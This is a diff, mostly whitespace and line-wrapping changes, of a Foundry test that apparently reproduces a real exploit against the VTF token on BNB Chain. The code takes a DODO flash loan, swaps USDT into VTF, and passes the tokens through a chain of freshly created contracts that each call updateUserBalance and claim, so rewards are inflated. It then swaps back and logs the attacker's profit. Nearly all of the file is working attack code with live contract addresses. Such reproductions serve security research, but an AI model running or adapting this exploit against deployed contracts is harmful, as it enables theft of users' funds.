@@ -15,10 +15,13 @@ import {IDVM} from "src/interfaces/IDVM.sol";
 // https://bscscan.com/tx/0xc2d2d7164a9d3cfce1e1dac7dc328b350c693feb0a492a6989ceca7104eef9b7
 
 interface IVTF is IERC20 {
+
     function updateUserBalance(address _user) external;
+
 }
 
 interface IROUTER {
+
     function swapExactTokensForTokensSupportingFeeOnTransferTokens(
         uint256 amountIn,
         uint256 amountOutMin,
@@ -26,9 +29,11 @@ interface IROUTER {
         address to,
         uint256 deadline
     ) external;
+
 }
 
 contract claimReward {
+
     IVTF VTF = IVTF(0xc6548caF18e20F88cC437a52B6D388b0D54d830D);
 
     constructor() {
@@ -39,9 +44,11 @@ contract claimReward {
         VTF.updateUserBalance(address(this));
         VTF.transfer(receiver, VTF.balanceOf(address(this)));
     }
+
 }
 
 contract ContractTest is Test {
+
     address constant dodo = 0x26d0c625e5F5D6de034495fbDe1F6e9377185618;
     IVTF VTF = IVTF(0xc6548caF18e20F88cC437a52B6D388b0D54d830D);
     IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
@@ -59,31 +66,18 @@ contract ContractTest is Test {
         vm.warp(block.timestamp + 2 * 24 * 60 * 60);
         IDVM(dodo).flashLoan(0, 100_000 * 1e18, address(this), new bytes(1));
 
-        emit log_named_decimal_uint(
-            "[End] Attacker USDT balance after exploit",
-            USDT.balanceOf(address(this)),
-            18
-        );
+        emit log_named_decimal_uint("[End] Attacker USDT balance after exploit", USDT.balanceOf(address(this)), 18);
     }
 
-    function DPPFlashLoanCall(
-        address sender,
-        uint256 baseAmount,
-        uint256 quoteAmount,
-        bytes calldata data
-    ) external {
+    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
         USDTToVTF();
         VTF.transfer(contractList[0], VTF.balanceOf(address(this)));
         for (uint256 i = 0; i < contractList.length - 1; ++i) {
-            (bool success1, ) = contractList[i].call(
-                abi.encodeWithSignature("claim(address)", contractList[i + 1])
-            );
+            (bool success1,) = contractList[i].call(abi.encodeWithSignature("claim(address)", contractList[i + 1]));
             require(success1);
         }
         uint256 index = contractList.length - 1;
-        (bool success, ) = contractList[index].call(
-            abi.encodeWithSignature("claim(address)", address(this))
-        );
+        (bool success,) = contractList[index].call(abi.encodeWithSignature("claim(address)", address(this)));
         require(success);
         VTFToUSDT();
         USDT.transfer(dodo, 100_000 * 1e18);
@@ -95,11 +89,7 @@ contract ContractTest is Test {
         path[0] = address(USDT);
         path[1] = address(VTF);
         Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            100_000 * 1e18,
-            0,
-            path,
-            address(this),
-            block.timestamp
+            100_000 * 1e18, 0, path, address(this), block.timestamp
         );
     }
 
@@ -109,11 +99,7 @@ contract ContractTest is Test {
         path[0] = address(VTF);
         path[1] = address(USDT);
         Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            VTF.balanceOf(address(this)),
-            0,
-            path,
-            address(this),
-            block.timestamp
+            VTF.balanceOf(address(this)), 0, path, address(this), block.timestamp
         );
     }
 
@@ -127,4 +113,5 @@ contract ContractTest is Test {
             contractList.push(_add);
         }
     }
+
 }
